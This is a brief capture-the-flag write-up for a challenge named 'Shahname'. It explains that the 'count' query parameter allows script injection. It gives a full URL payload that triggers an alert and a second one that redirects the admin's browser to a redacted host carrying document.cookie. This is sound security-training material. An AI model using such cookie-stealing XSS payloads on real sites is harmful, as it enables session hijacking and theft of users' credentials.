# Shahname

# Description

my homework seems secure.


# Solution

the count query paramter vulnerable to XSS via code injection

to trigger an alert:

`https://shahname-chall.fmc.tf/?count=1");alert(1);("`


the url for reporting, and getting flag from admin's cookies

`https://shahname-chall.fmc.tf/?count=1");location="REDACTED?flag="+document.cookie;("`
